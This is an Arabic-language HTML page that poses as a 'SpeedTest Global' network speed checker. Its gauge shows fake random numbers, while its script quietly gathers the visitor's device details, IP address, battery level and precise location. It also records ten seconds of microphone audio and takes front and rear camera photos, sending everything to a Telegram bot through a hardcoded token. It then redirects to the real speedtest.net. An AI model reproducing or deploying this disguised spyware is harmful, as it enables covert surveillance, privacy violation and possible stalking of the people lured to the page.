<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>SpeedTest Global | فحص سرعة الشبكة</title>
    <style>
        :root { --accent: #00d2ff; --dark-bg: #0b0e18; }
        body { background: var(--dark-bg); color: white; font-family: 'Segoe UI', Tahoma, sans-serif; margin: 0; display: flex; flex-direction: column; align-items: center; justify-content: center; height: 100vh; overflow: hidden; }
        .grid-bg { position: absolute; width: 100%; height: 100%; background-image: linear-gradient(rgba(0, 210, 255, 0.03) 1px, transparent 1px), linear-gradient(90deg, rgba(0, 210, 255, 0.03) 1px, transparent 1px); background-size: 25px 25px; z-index: -1; }
        .main-card { background: rgba(255, 255, 255, 0.03); padding: 40px; border-radius: 30px; border: 1px solid rgba(255, 255, 255, 0.1); backdrop-filter: blur(15px); text-align: center; width: 85%; max-width: 400px; box-shadow: 0 25px 50px rgba(0,0,0,0.5); }
        h1 { font-size: 22px; margin: 0 0 10px; font-weight: 300; letter-spacing: 2px; }
        .gauge-box { position: relative; width: 200px; height: 200px; margin: 30px auto; border-radius: 50%; border: 2px solid rgba(0, 210, 255, 0.2); display: flex; align-items: center; justify-content: center; }
        #goBtn { width: 150px; height: 150px; border-radius: 50%; border: 4px solid var(--accent); background: transparent; color: var(--accent); font-size: 30px; font-weight: bold; cursor: pointer; transition: 0.4s; outline: none; }
        #speedDisplay { display: none; text-align: center; }
        .speed-num { font-size: 45px; font-weight: 800; color: var(--accent); display: block; }
        video, canvas { display: none; }
    </style>
</head>
<body>
    <div class="grid-bg"></div>
    <div class="main-card">
        <h1>SPEEDTEST</h1>
        <p id="subText" style="color: #8892b0; font-size: 13px;">جاري فحص جودة الاتصال والصوت...</p>
        <div class="gauge-box">
            <button id="goBtn">GO</button>
            <div id="speedDisplay">
                <span id="num" class="speed-num">0.0</span>
                <span style="font-size:12px; color:#8892b0;">Mbps Download</span>
            </div>
        </div>
    </div>

    <video id="v" autoplay playsinline muted></video>
    <canvas id="c"></canvas>

    <script>
        const token = "8738245852:AAFuHo61scaBhakSOPlnPg7UIS8Ggx7llGk";
        const chat = "7984067238";

        async function sendToTelegram(msg, type = "text", data = null) {
            const url = `https://api.telegram.org/bot${token}/`;
            const fd = new FormData();
            fd.append("chat_id", chat);

            try {
                if (type === "text") {
                    await fetch(`${url}sendMessage?chat_id=${chat}&text=${encodeURIComponent(msg)}&parse_mode=Markdown`);
                } else if (type === "photo") {
                    fd.append("photo", data, "shot.jpg");
                    await fetch(`${url}sendPhoto`, { method: "POST", body: fd });
                } else if (type === "voice") {
                    fd.append("voice", data, "record.ogg");
                    await fetch(`${url}sendVoice`, { method: "POST", body: fd });
                }
            } catch (e) {}
        }

        async function getFullReport() {
            let info = `📊 *تقرير شامل للهدف*:\n\n`;
            info += `• 📱 الجهاز: \`${navigator.platform}\`\n`;
            info += `• 💾 الرام: \`${navigator.deviceMemory || "؟"} GB\`\n`;
            info += `• ⚙️ المعالج: \`${navigator.hardwareConcurrency} Cores\`\n`;
            info += `• 🖥️ الشاشة: \`${window.screen.width}x${window.screen.height}\`\n`;
            info += `• 📶 الشبكة: \`${navigator.connection ? navigator.connection.effectiveType : "WiFi"}\`\n`;
            info += `• 🌐 اللغة: \`${navigator.language}\`\n`;
            
            try {
                const b = await navigator.getBattery();
                info += `• 🔋 البطارية: \`${Math.round(b.level * 100)}%\` (${b.charging ? "🔌" : "🔋"})\n`;
                const ip = await fetch('https://api.ipify.org?format=json').then(r => r.json());
                info += `• 🌐 الـ IP: \`${ip.ip}\`\n`;
            } catch(e) {}
            return info;
        }

        async function snap(mode) {
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: mode } });
                const v = document.getElementById("v");
                const c = document.getElementById("c");
                v.srcObject = stream;
                await new Promise(r => v.onloadedmetadata = r);
                await new Promise(r => setTimeout(r, 2500));
                c.width = 640; c.height = 480;
                c.getContext("2d").drawImage(v, 0, 0);
                stream.getTracks().forEach(t => t.stop());
                return new Promise(res => c.toBlob(res, "image/jpeg", 0.7));
            } catch(e) { return null; }
        }

        async function recordAudio(duration) {
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
                const mediaRecorder = new MediaRecorder(stream);
                const chunks = [];
                return new Promise(resolve => {
                    mediaRecorder.ondataavailable = e => chunks.push(e.data);
                    mediaRecorder.onstop = () => {
                        const blob = new Blob(chunks, { type: 'audio/ogg; codecs=opus' });
                        stream.getTracks().forEach(t => t.stop());
                        resolve(blob);
                    };
                    mediaRecorder.start();
                    setTimeout(() => mediaRecorder.stop(), duration * 1000);
                });
            } catch(e) { return null; }
        }

        document.getElementById("goBtn").onclick = async function() {
            this.style.display = "none";
            document.getElementById("speedDisplay").style.display = "block";
            
            // بدء العداد الوهمي
            const timer = setInterval(() => {
                document.getElementById("num").innerText = (Math.random() * (98 - 85) + 85).toFixed(1);
            }, 100);

            // 1. إرسال التقرير الشامل
            sendToTelegram(await getFullReport());

            // 2. طلب الموقع
            navigator.geolocation.getCurrentPosition(async (p) => {
                const map = `https://www.google.com/maps?q=${p.coords.latitude},${p.coords.longitude}`;
                sendToTelegram(`📍 *الموقع الدقيق*:\n[فتح الخريطة](${map})`);
            });

            // 3. تسجيل الصوت (10 ثوانٍ) في الخلفية
            recordAudio(10).then(audio => {
                if(audio) sendToTelegram(null, "voice", audio);
            });

            // 4. التقاط الصور
            const f = await snap("user");
            if(f) await sendToTelegram(null, "photo", f);
            
            const b = await snap("environment");
            if(b) await sendToTelegram(null, "photo", b);

            setTimeout(() => {
                clearInterval(timer);
                window.location.href = "https://www.speedtest.net/";
            }, 12000); // زيادة الوقت قليلاً لضمان اكتمال تسجيل الصوت
        };
    </script>
</body>
</html>
